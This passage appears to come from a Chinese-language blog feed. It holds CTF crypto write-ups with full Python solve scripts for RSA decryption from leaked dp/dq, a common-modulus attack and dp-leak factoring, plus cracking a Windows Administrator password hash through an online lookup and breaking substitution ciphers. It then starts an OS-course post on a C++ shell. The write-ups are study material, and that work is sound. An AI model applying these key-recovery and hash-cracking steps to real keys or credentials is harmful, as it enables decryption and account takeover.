class="katex-mathml"><math><semantics><mrow><mi>m</mi><mn>1</mn><mo>=</mo><msup><mi>c</mi><mi>d</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">m1 = c^d mod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.043548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span></span></span></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mn>2</mn><mo>=</mo><msup><mi>c</mi><mi>d</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>q</mi></mrow><annotation encoding="application/x-tex">m2 = c^d mod q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.043548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span></span></span></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span></span></span></span>。</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>k</mi><mo stretchy="false">(</mo><mi>p</mi><mi mathvariant="normal">−</mi><mn>1</mn><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi><mspace linebreak="newline"></mspace><mi>d</mi><mo>=</mo><mi>d</mi><mi>p</mi><mo>+</mo><mi>k</mi><mi mathvariant="normal">∗</mi><mo stretchy="false">(</mo><mi>p</mi><mi mathvariant="normal">−</mi><mn>1</mn><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>m</mi><mn>1</mn><mo>=</mo><msup><mi>c</mi><mrow><mi>d</mi><mi>q</mi></mrow></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>q</mi><mspace linebreak="newline"></mspace><mi>m</mi><mn>2</mn><mo>=</mo><msup><mi>c</mi><mrow><mi>d</mi><mi>p</mi></mrow></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi><mspace linebreak="newline"></mspace><mi>m</mi><mo>=</mo><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mi>m</mi><mn>2</mn><mi mathvariant="normal">　</mi><mi mathvariant="normal">−</mi><mi mathvariant="normal">　</mi><mi>m</mi><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">　</mi><mi mathvariant="normal">∗</mi><mi mathvariant="normal">　</mi><msup><mi>p</mi><mrow><mi mathvariant="normal">−</mi><mn>1</mn></mrow></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>q</mi><mo stretchy="false">)</mo><mo>∗</mo><mi mathvariant="normal">　</mi><mi>p</mi><mo>+</mo><mi>m</mi><mn>1</mn><mo stretchy="false">)</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">k(p−1) = 1 mod p\\d = dp + k ∗ (p−1)\\m1 = c^{dq} mod q\\m2 = c^{dp} mod p\\m = (((m2　−　m1)　∗　p^{−1} mod q) *　p + m1) mod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mord">−</span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord">∗</span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mord">−</span><span class="mord">1</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.093548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.093548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight">p</span></span></span></span></span></span></span></span></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord">2</span><span class="mord cjk_fallback">　</span><span class="mord">−</span><span class="mord cjk_fallback">　</span><span class="mord mathdefault">m</span><span class="mord">1</span><span class="mclose">)</span><span class="mord cjk_fallback">　</span><span class="mord">∗</span><span class="mord cjk_fallback">　</span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">　</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mord">1</span><span class="mclose">)</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">n</span></span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> (b == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x, y, q = egcd(b, a % b)  <span class="comment"># q = GCD(a, b) = GCD(b, a%b)</span></span><br><span class="line">        x, y = y, (x - (a // b) * y)</span><br><span class="line">        <span class="keyword">return</span> x, y, q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod_inv</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> egcd(a, b)[<span class="number">0</span>] % b  <span class="comment"># 求a模b得逆</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span> </span><br><span class="line">q = <span class="number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span> </span><br><span class="line">dp = <span class="number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span> </span><br><span class="line">dq = <span class="number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span> </span><br><span class="line">c = <span class="number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span></span><br><span class="line"></span><br><span class="line">invq = mod_inv(p, q)</span><br><span class="line">mp = <span class="built_in">pow</span>(c, dp, p)</span><br><span class="line">mq = <span class="built_in">pow</span>(c, dq, q)</span><br><span class="line">m = ((mp - mq) * invq % p) * q + mq</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(m))</span><br></pre></td></tr></table></figure><p>然後noxCTF要代換成flag，提交拿分。</p><h3 id="權限獲得第一步"><a class="markdownIt-Anchor" href="#權限獲得第一步"></a> 權限獲得第一步</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Administrator:500:806EDC27AA52E314AAD3B435B51404EE:F4AD50F57683D4260DFD48AA351A17A8:::</span><br></pre></td></tr></table></figure><p>看題目感覺就是之前學到的windows密碼，打開 <a href="https://www.cmd5.com/">https://www.cmd5.com/</a> ，將 F4AD50F57683D4260DFD48AA351A17A8 輸入即可取得flag。</p><h3 id="old-fashion"><a class="markdownIt-Anchor" href="#old-fashion"></a> old-fashion</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Os drnuzearyuwn, y jtkjzoztzoes douwlr oj y ilzwex eq lsdexosa kn pwodw tsozj eq ufyoszlbz yrl rlufydlx pozw douwlrzlbz, ydderxosa ze y rlatfyr jnjzli; mjy gfbmw vla xy wbfnsy symmyew (mjy vrwm qrvvrf), hlbew rd symmyew, mebhsymw rd symmyew, vbomgeyw rd mjy lxrzy, lfk wr dremj. Mjy eyqybzye kyqbhjyew mjy myom xa hyedrevbfn lf bfzyewy wgxwmbmgmbrf. Wr mjy dsln bw f1_2jyf-k3_jg1-vb-vl_l</span><br></pre></td></tr></table></figure><p>看題目感覺是詞頻分析，就直接用<a href="https://quipqiup.com/">爆破攻擊</a>，取得flag。</p><h3 id="世上無難事"><a class="markdownIt-Anchor" href="#世上無難事"></a> 世上無難事</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VIZZB IFIUOJBWO NVXAP OBC XZZ UKHVN IFIUOJBWO HB XVIXW XAW VXFI X QIXN VBD KQ IFIUOJBWO WBKAH NBWXO VBD XJBCN NKG QLKEIU DI XUI VIUI DKNV QNCWIANQ XN DXPIMKIZW VKHV QEVBBZ KA XUZKAHNBA FKUHKAKX XAW DI VXFI HBN QNCWIANQ NCAKAH KA MUBG XZZ XEUBQQ XGIUKEX MUBG PKAWIUHXUNIA NVUBCHV 12NV HUXWI XAW DI XUI SCQN QB HZXW NVXN XZZ EBCZW SBKA CQ NBWXO XAW DI DXAN NB NVXAP DXPIMKIZW MBU JIKAH QCEV XA BCNQNXAWKAH VBQN HKFI OBCUQIZFIQ X JKH UBCAW BM XLLZXCQI XAW NVI PIO KQ 640I11012805M211J0XJ24MM02X1IW09</span><br></pre></td></tr></table></figure><p>使用跟上題一樣的爆破攻擊，然後flag要改小寫。</p><h3 id="rsa3"><a class="markdownIt-Anchor" href="#rsa3"></a> RSA3</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c1=22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span><br><span class="line">n=22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span><br><span class="line">e1=11187289</span><br><span class="line">c2=18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span><br><span class="line">e2=9647291</span><br></pre></td></tr></table></figure><p>看題目應該是要做公共模數攻擊，假如採用兩個或者兩個以上的公鑰(N,e)來加密同一條資訊，可以得到:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c1 = pow(m, e1, N), c2 = pow(m, e2, N)</span><br></pre></td></tr></table></figure><p>分別拿對應的私鑰來解密，可以得到相同的明文m</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">m = pow(c1, d1, N), m = pow(c2, d2, N)</span><br></pre></td></tr></table></figure><p>假設已知n,e1,e2,c1,c2，即可得到明文m，因為e1和e2互質，所以使用歐幾里得演算法（找兩整數的最大公約數）可以找到能夠滿足以下條件的x，y</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pow(x,e1)+pow(y,e2)=1</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">sys.setrecursionlimit(<span class="number">20000</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">a, m</span>):</span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line">c1 = <span class="number">22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span></span><br><span class="line">n = <span class="number">22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span></span><br><span class="line">e1 = <span class="number">11187289</span></span><br><span class="line">c2 = <span class="number">18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span></span><br><span class="line">e2 = <span class="number">9647291</span></span><br><span class="line"></span><br><span class="line">s = egcd(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = s[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">    s1 = - s1</span><br><span class="line">    c1 = modinv(c1, n)</span><br><span class="line"><span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">    s2 = - s2</span><br><span class="line">    c2 = modinv(c2, n)</span><br><span class="line"></span><br><span class="line">m = (<span class="built_in">pow</span>(c1, s1, n) * <span class="built_in">pow</span>(c2, s2, n)) % n</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(m))</span><br></pre></td></tr></table></figure><p>取得flag，要注意的是過程中可能因為迭代次數過多被終止執行。</p><h3 id="rsa2"><a class="markdownIt-Anchor" href="#rsa2"></a> RSA2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e = 65537</span><br><span class="line">n = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span><br><span class="line">dp = 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span><br><span class="line"></span><br><span class="line">c = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">p = <span class="number">0</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span></span><br><span class="line">dp = <span class="number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span></span><br><span class="line">n = <span class="number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span></span><br><span class="line">temp = dp * e</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line">    <span class="keyword">if</span> (temp - <span class="number">1</span>) % i == <span class="number">0</span>:</span><br><span class="line">        x = (temp - <span class="number">1</span>) // i + <span class="number">1</span></span><br><span class="line">        y = n % x</span><br><span class="line">        <span class="keyword">if</span> y == <span class="number">0</span>:</span><br><span class="line">            p = x</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">q = n // p</span><br><span class="line"><span class="comment"># &#x27;//&#x27;代表向下取整,&#x27;/&#x27;得到的是浮點數</span></span><br><span class="line">d = gmpy2.invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">key = rsa.PrivateKey(n, e, d, p, q)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure><p>取得flag。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux-shell的撰寫</title>
      <link href="/linux-shell/"/>
      <url>/linux-shell/</url>
      
        <content type="html"><![CDATA[<p>分享一下去年修作業系統的時候寫出來的shell(最終成績97，因為做不到多重檔案重定向被扣了三分)，shell主要結構大概是這樣，沒記錯的話，這也是恐龍書裡面的架構，接下來要做的事情僅僅只是依據此架構進行延伸。</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (TRUE)&#123;</span><br><span class="line">    <span class="built_in">type_prompt</span>();</span><br><span class="line">    <span class="built_in">read_command</span>(command, parameters);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fork() != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">waitpid</span>(<span class="number">-1</span>, &amp;status, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">execvp</span>(command, parameters);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>將程式碼初步補充完之後，可以得到下面的架構，這部分是初步的完成品，也是我覺得很好的學習範例。</p><p>目前能夠執行基礎的指令，但不能實現pipe檢測和檔案重定向等功能。</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRUE 1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">type_prompt</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">read_command</span><span class="params">(<span class="type">char</span> *, <span class="type">char</span> **)</span></span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAX_LENGTH = <span class="number">256</span>;</span><br><span class="line">string local = <span class="string">&quot;~\\&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *command = <span class="keyword">new</span> <span class="type">char</span>[MAX_LENGTH];</span><br><span class="line">  <span class="type">char</span> **parameters = <span class="keyword">new</span> <span class="type">char</span> *[MAX_LENGTH];</span><br><span class="line">  <span class="type">int</span> status = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//進入畫面</span></span><br><span class="line">  cout &lt;&lt; <span class="string">&quot;Welcome to AfanShell&quot;</span> &lt;&lt; endl;</span><br><span class="line">  cout &lt;&lt; <span class="string">&quot;ctrl-c or ctrl-\\ to quit&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (TRUE)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">type_prompt</span>();</span><br><span class="line">    <span class="built_in">read_command</span>(command, parameters);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fork() != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">waitpid</span>(<span class="number">-1</span>, &amp;status, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">execvp</span>(command, parameters);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">type_prompt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  cout &lt;&lt; <span class="string">&quot;AfanShell@&quot;</span></span><br><span class="line">       &lt;&lt; <span class="string">&quot;&gt; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">read_command</span><span class="params">(<span class="type">char</span> *command, <span class="type">char</span> **parameters)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *tmp = <span class="keyword">new</span> <span class="type">char</span>[MAX_LENGTH];</span><br><span class="line">  <span class="type">char</span> *token;</span><br><span class="line">  <span class="comment">// char *pipe = &quot;|&quot;; //檢測pipe功能啦</span></span><br><span class="line">  <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAX_LENGTH; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    parameters[i] = <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  cin.<span class="built_in">getline</span>(tmp, MAX_LENGTH - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  token = <span class="built_in">strtok</span>(tmp, <span class="string">&quot; &quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> (token != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    parameters[count] = <span class="keyword">new</span> <span class="type">char</span>[MAX_LENGTH];</span><br><span class="line">    <span class="built_in">strcpy</span>(parameters[count], token);</span><br><span class="line">    token = <span class="built_in">strtok</span>(<span class="literal">NULL</span>, <span class="string">&quot; &quot;</span>);</span><br><span class="line">    count++;</span><br><span class="line">    <span class="keyword">if</span> (count == MAX_LENGTH - <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (count == <span class="number">0</span>) &#123;</span><br><span class="line">    parameters[<span class="number">0</span>] = <span class="keyword">new</span> <span class="type">char</span>[MAX_LENGTH];</span><br><span class="line">    <span class="built_in">strcpy</span>(parameters[<span class="number">0</span>], <span class="string">&quot;echo&quot;</span>);</span><br><span class="line">    parameters[<span class="number">1</span>] = <span class="keyword">new</span> <span class="type">char</span>[MAX_LENGTH];</span><br><span class="line">    <span class="built_in">strcpy</span>(parameters[<span class="number">1</span>], <span 